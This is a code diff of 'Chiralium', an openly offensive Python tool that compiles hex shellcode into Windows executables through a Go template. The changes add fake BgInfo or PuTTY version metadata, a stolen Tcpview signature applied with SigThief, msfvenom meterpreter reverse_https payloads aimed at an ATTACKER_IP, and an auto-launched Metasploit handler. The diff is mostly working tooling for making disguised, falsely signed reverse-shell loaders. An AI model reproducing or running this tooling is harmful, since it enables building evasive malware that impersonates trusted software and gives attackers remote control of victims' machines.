@@ -4,6 +4,7 @@
 
 import sys
 import os
+import shutil
 import argparse
 import hashlib
 import subprocess, shlex
@@ -84,6 +85,7 @@ def safechecks(appdir):
 	 	cprint("[-] Directory not found: {0}/output/.".format(appdir), "yellow")
 	 	os.mkdir('{0}/output/'.format(appdir))
 	 	cprint("[-] Directory {0}/output/ is now created.".format(appdir), "yellow")
+
 	if bad == 1:
 		print('[-] Fix this before anything. Exiting')
 		sys.exit(0)
@@ -91,7 +93,7 @@ def safechecks(appdir):
 
 
 	
-def craftbinary(shellcodefile,outputdir,biname,appdir):
+def craftgofile(shellcodefile,outputdir,biname,appdir):
 	try:
 		print("[+] Using",colored("{0}".format(shellcodefile),"green"),"as hex shellcode ...")
 		# read template GO file
@@ -128,14 +130,34 @@ def craftbinary(shellcodefile,outputdir,biname,appdir):
 		cprint("[-] An error occurred while crafting the binary : {0}".format(e), "red")
 
 
-def buildbinary(platform,arch,outputdir,biname):
-	# if not ".exe" in biname:
-	# 	biname += ".exe"
+def buildbinary(platform,arch,outputdir,biname,metadata):
+
 	try:
+		# Need to move .go and .syso to the same dir, without any other .go file. 
+		# I can't build with metadata if I specify my .go file, it's stupid. But I don't know why :/
+
+		# temp dir to build here & add metada
+		tmpdir = "{0}/tmp/".format(outputdir)
+		if not os.path.isdir(tmpdir):
+	 		os.mkdir(tmpdir)
+
+		print("[+] Using metadata from",colored("{0}".format(metadata),"green"),"...")
+		subprocess.Popen(shlex.split("cp res/syso/{0}.syso {1}/{2}.go {3}".format(metadata,outputdir,biname, tmpdir)), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
 		print("[+] Building binary for arch",colored("{0}".format(arch),"green"),"...")
-		cmdbuild = "GOOS={0} GOARCH={1} go build -o {2}/{3} {2}/{3}.go".format(platform,arch,outputdir,biname)
+		cmdbuild = "cd {2} && GOOS={0} GOARCH={1} go build -o {3}".format(platform,arch,tmpdir,biname)
 		print("[+] Building:",colored("{0}".format(cmdbuild),"green"))
 		s = os.system(cmdbuild)
+		
+		# move exe & go file. 
+		print("[+] Moving/removing all from",colored("{0}".format(tmpdir),"yellow"),"to",colored("{0}".format(outputdir),"yellow"),"...")
+		
+		files_in_tmp = os.listdir(tmpdir)
+		for f in files_in_tmp:
+			if not f.endswith("syso"):
+				shutil.move(tmpdir + f, outputdir + "/" + f)
+		# delete the tmp dir
+		shutil.rmtree(tmpdir)
 		if s == 0:
 			print("[+] Go file is:", colored("{0}/{1}.go ".format(outputdir,biname),"green"))
 			print("[+] Binary file is:", colored("{0}/{1} ".format(outputdir,biname),"green"))
@@ -173,11 +195,10 @@ def msfvenom_generator(platform,arch,shellcodedir,shellcodename,lhost,lport,msfp
 	rcfile = '{0}/{1}.rc'.format(shellcodedir,shellcodename)
 	with open(rcfile,'w') as f:
 		f.write(rc)
-	print("[+] You can use this resource file : ",colored(rcfile,'blue'))
-	cprint(rc,'blue')
+	print("[+] You can use this resource file :",colored(rcfile + "\n" + rc,'blue'))
 
 # Using sigthief (https://github.com/secretsquirrel/SigThief) to add an (invalid) signature to the binary
-def sign_binary(biname,outputdir,signature="signatures/Tcpview.exe_sig"):
+def sign_binary(biname,outputdir,signature):
 	print("[+] Using SigThief to sign the binary with the signature",colored(signature,"yellow"))
 	cmd = "python3 libs/sigthief.py -t {0}/{1} -s {2} -o {0}/{1}_signed.exe".format(outputdir,biname,signature)
 	subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -190,7 +211,7 @@ def msfvenom_generator_rc(payload,lhost,lport):
 	rc += "set LHOST {0}\n".format(lhost)
 	rc += "set LPORT {0}\n".format(lport)
 	rc += "set ExitOnSession false\n"
-	rc += "exploit -j\n"
+	rc += "exploit -j"
 	return rc
 
 
@@ -212,13 +233,14 @@ if __name__ == '__main__':
 	_msfvenomargs86 = config['msfvenomargs86']
 	_msfvenomargs64 = config['msfvenomargs64']
 	_platform = config['platform']
-	_signature = config['signature']
 	
 	safechecks(_appdir)
 
 	parser = argparse.ArgumentParser(description="Chiralium : a dirty GO shellcode-to-binary generator.")
 	parser.add_argument('-p', '--platform', type=str, default=_platform, help="Platform for compilation (windows only for the moment)")
 	parser.add_argument('-sc', '--shellcode', type=str, help="File containing HEX shellcode (41414141)")
+	parser.add_argument('-m', '--metadata', type=str, default="none", help="Choose metadata to add using 'syso' COFF (pre-generated with goversioninfo) : none, bginfo,putty")
+	parser.add_argument('-s', '--signature', type=str, default="signatures/Tcpview.exe_sig", help="Choose signature file to add (default: signatures/Tcpview.exe_sig)")
 	parser.add_argument('-a', '--arch', type=str, default="x86", help="The architecture to use (x86 or x64)")
 	parser.add_argument('-t', '--test', action='store_true', default=False, help="Test to build a default shellcode that spawn a calc.")
 	parser.add_argument('-msf', '--msfvenom', action='store_true', default=False, help="Generate a meterpreter/reverse_https shellcode with msfvenom")
@@ -234,9 +256,9 @@ if __name__ == '__main__':
 
 	if args.test:
 		cprint("[-] Test mode activate : ignoring all options, using default.","yellow")
-		craftbinary(_shellcodefile,_outputdir, "test_calc.exe",_appdir)
-		buildbinary("windows", "386", _outputdir,"test_calc.exe")
-		sign_binary("test_calc.exe",_outputdir,_signature)
+		craftgofile(_shellcodefile,_outputdir, "test_calc.exe",_appdir)
+		buildbinary("windows", "386", _outputdir,"test_calc.exe",args.metadata)
+		sign_binary("test_calc.exe",_outputdir,args.signature)
 		sys.exit()
 
 	# ARCH
@@ -270,23 +292,21 @@ if __name__ == '__main__':
 
 	# SHELLCODE FILE + CRAFT
 	if args.shellcode:
-		craftbinary(args.shellcode,_outputdir, _biname, _appdir)
+		craftgofile(args.shellcode,_outputdir, _biname, _appdir)
 	elif args.msfvenom == True: 
 		if not args.lhost:
 			cprint("[-] LHOST is not specify ! Use --lhost ATTACKER_IP. Exiting", "red")
 			sys.exit()
 		msfvenom_generator(_platform, goarch, _shellcodedir, _biname, args.lhost, args.lport,msfvenomargs)
-		craftbinary("{0}/{1}.hex".format(_shellcodedir,_biname),_outputdir, _biname, _appdir)
+		craftgofile("{0}/{1}.hex".format(_shellcodedir,_biname),_outputdir, _biname, _appdir)
 	else:
 		print(args.msfvenom)
 		print("[+] No shellcode specify ! Using default {0} ...".format(_shellcodefile))
-		craftbinary(_shellcodefile,_outputdir, _biname, _appdir)
+		craftgofile(_shellcodefile,_outputdir, _biname, _appdir)
 
 	# BINARY BUILDING
-	buildbinary(goos, goarch, _outputdir, _biname)
-	sign_binary(_biname,_outputdir,_signature)
+	buildbinary(goos, goarch, _outputdir, _biname,args.metadata)
+	sign_binary(_biname,_outputdir,args.signature)
 	if args.rc and args.msfvenom:
 		cprint("[-] Running msfconsole with associated resource file...", "blue")
 		cmd = os.system("msfconsole -r {0}/{1}.rc".format(_shellcodedir,_biname))
-
-
